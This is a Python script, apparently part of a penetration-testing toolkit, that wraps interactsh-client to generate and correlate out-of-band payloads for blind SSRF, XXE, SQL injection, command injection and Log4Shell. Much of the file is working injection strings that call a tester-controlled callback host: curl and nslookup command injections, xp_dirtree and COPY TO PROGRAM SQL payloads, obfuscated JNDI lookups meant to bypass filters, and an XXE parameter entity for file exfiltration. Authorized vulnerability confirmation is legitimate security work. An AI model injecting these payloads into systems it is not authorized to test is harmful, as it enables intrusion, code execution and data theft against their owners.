#!/usr/bin/env python3
"""
Out-of-band (OOB) interaction orchestrator — confirms BLIND vulnerabilities.

Wraps ProjectDiscovery's `interactsh-client` (registered in external_arsenal as
`interactsh-client|oob`). Generates per-injection-point payloads embedding a
unique OOB hostname, then correlates received DNS/HTTP/SMTP interactions back to
the payload that triggered them — turning un-confirmable blind bugs into proven
ones:

  blind SSRF   server fetches http://<uid>.<oob>           -> HTTP/DNS hit
  blind XXE    parser resolves SYSTEM "http://<uid>.<oob>" -> HTTP/DNS hit
  blind SQLi   xp_dirtree / LOAD_FILE / UTL_HTTP to <oob>  -> DNS/SMB hit
  blind RCE    curl/nslookup/ping <uid>.<oob>              -> DNS/HTTP hit
  Log4Shell    ${jndi:ldap://<uid>.<oob>/a}                -> DNS/LDAP hit

Payload generation + correlation are pure and unit-tested (no binary needed).
`listen()` / `poll()` shell out to interactsh-client.

Usage:
  tools/oob_listener.py --payloads oob.example.com        # just emit payloads
  tools/oob_listener.py --payloads oob.example.com --class ssrf,sqli
  tools/oob_listener.py --listen                          # run interactsh-client
"""
from __future__ import annotations

import argparse
import json
import shutil
import subprocess
import sys
import uuid
from dataclasses import dataclass

VULN_CLASSES = ["ssrf", "xxe", "sqli", "rce", "log4shell"]


def _uid() -> str:
    return uuid.uuid4().hex[:12]


def oob_payloads(domain: str, classes: list[str] | None = None) -> dict[str, list[dict]]:
    """Return {class: [{marker, payload}]}.

    Each payload embeds a unique `<marker>.<domain>` host so an inbound
    interaction can be correlated to the exact injection point. Pure function.
    """
    classes = classes or VULN_CLASSES
    out: dict[str, list[dict]] = {}

    if "ssrf" in classes:
        m = f"ssrf-{_uid()}.{domain}"
        out["ssrf"] = [
            {"marker": m, "payload": f"http://{m}/"},
            {"marker": m, "payload": f"https://{m}/"},
            # bypass forms that still resolve our host out-of-band:
            {"marker": m, "payload": f"http://{m}@127.0.0.1/"},
            {"marker": m, "payload": f"http://127.0.0.1#@{m}/"},
            {"marker": m, "payload": f"gopher://{m}:80/_GET / HTTP/1.0"},
        ]
    if "xxe" in classes:
        m = f"xxe-{_uid()}.{domain}"
        ext = (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY x SYSTEM "http://{m}/x">]>'
            "<r>&x;</r>"
        )
        # OOB exfil via parameter entity (host an evil.dtd that reads a file)
        param = (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY % p SYSTEM "http://{m}/evil.dtd"> %p;]>'
            "<r>1</r>"
        )
        out["xxe"] = [
            {"marker": m, "payload": ext},
            {"marker": m, "payload": param},
        ]
    if "sqli" in classes:
        m = f"sqli-{_uid()}.{domain}"
        out["sqli"] = [
            {"marker": m, "payload": f"'; exec master..xp_dirtree '\\\\{m}\\x'--"},  # MSSQL
            {"marker": m, "payload": f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{m}\\\\x'))-- -"},  # MySQL
            {"marker": m, "payload": f"' || UTL_HTTP.REQUEST('http://{m}/')-- -"},  # Oracle
            {"marker": m, "payload": f"; COPY (SELECT '') TO PROGRAM 'nslookup {m}'-- -"},  # Postgres
        ]
    if "rce" in classes:
        m = f"rce-{_uid()}.{domain}"
        out["rce"] = [
            {"marker": m, "payload": f"; curl http://{m}/"},
            {"marker": m, "payload": f"$(curl http://{m}/)"},
            {"marker": m, "payload": f"`nslookup {m}`"},
            {"marker": m, "payload": f"| ping -c1 {m}"},
            {"marker": m, "payload": f"&& powershell -c \"nslookup {m}\""},
        ]
    if "log4shell" in classes:
        m = f"log4j-{_uid()}.{domain}"
        out["log4shell"] = [
            {"marker": m, "payload": f"${{jndi:ldap://{m}/a}}"},
            {"marker": m, "payload": f"${{jndi:dns://{m}/a}}"},
            {"marker": m, "payload": f"${{${{lower:j}}ndi:ldap://{m}/a}}"},  # filter bypass
        ]
    return out


@dataclass
class Correlation:
    marker: str
    vuln_class: str
    protocol: str
    raw: dict


def correlate(interactions: list[dict], payloads: dict[str, list[dict]]) -> list[Correlation]:
    """Match interactsh interactions to the payload markers that caused them.

    interactsh `-json` emits objects with at least `unique-id`/`full-id` and
    `protocol`. We match on the marker substring appearing in the full host.
    Pure function.
    """
    # build marker -> class index
    marker_class: dict[str, str] = {}
    for vclass, items in payloads.items():
        for it in items:
            marker_class[it["marker"]] = vclass

    results: list[Correlation] = []
    for inter in interactions:
        host = (
            inter.get("full-id")
            or inter.get("fullId")
            or inter.get("unique-id")
            or inter.get("host")
            or ""
        ).lower()
        proto = inter.get("protocol", inter.get("proto", "unknown"))
        for marker, vclass in marker_class.items():
            # the unique left-label (e.g. ssrf-abc123def456) survives in the host
            left = marker.split(".")[0]
            if left and left in host:
                results.append(Correlation(marker, vclass, proto, inter))
                break
    return results


def _have_interactsh() -> bool:
    return shutil.which("interactsh-client") is not None


def listen(timeout: int | None = None) -> int:
    """Run interactsh-client in JSON mode (streams interactions to stdout)."""
    if not _have_interactsh():
        print("interactsh-client not found — install:\n"
              "  GOBIN=$HOME/go/bin go install "
              "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
              file=sys.stderr)
        return 127
    cmd = ["interactsh-client", "-json"]
    try:
        return subprocess.call(cmd, timeout=timeout)
    except subprocess.TimeoutExpired:
        return 0
    except KeyboardInterrupt:
        return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="OOB interaction orchestrator (interactsh)")
    ap.add_argument("--payloads", metavar="OOB_DOMAIN",
                    help="generate blind-bug payloads for this interactsh domain")
    ap.add_argument("--class", dest="classes",
                    help=f"comma list of {','.join(VULN_CLASSES)}")
    ap.add_argument("--listen", action="store_true", help="run interactsh-client (-json)")
    ap.add_argument("--correlate", metavar="INTERACTIONS_JSON",
                    help="path to interactsh -json output; needs --payloads-file")
    ap.add_argument("--payloads-file", help="saved payloads JSON for --correlate")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args(argv)

    if args.listen:
        return listen()

    if args.correlate:
        inters = [json.loads(l) for l in open(args.correlate) if l.strip()]
        payloads = json.load(open(args.payloads_file)) if args.payloads_file else {}
        hits = correlate(inters, payloads)
        for h in hits:
            print(f"[CONFIRMED] blind {h.vuln_class} via {h.protocol} — marker {h.marker}")
        return 2 if hits else 0

    if args.payloads:
        classes = [c.strip() for c in args.classes.split(",")] if args.classes else None
        payloads = oob_payloads(args.payloads, classes)
        if args.json:
            print(json.dumps(payloads, indent=2))
        else:
            for vclass, items in payloads.items():
                print(f"# {vclass}")
                for it in items:
                    print(f"  {it['payload']}")
            print("\n# 1) run the listener:   tools/oob_listener.py --listen > inter.jsonl")
            print("# 2) inject the payloads above into the target")
            print("# 3) correlate hits:      tools/oob_listener.py --correlate inter.jsonl "
                  "--payloads-file payloads.json")
        return 0

    ap.error("provide --payloads <oob-domain>, --listen, or --correlate")


if __name__ == "__main__":
    sys.exit(main())
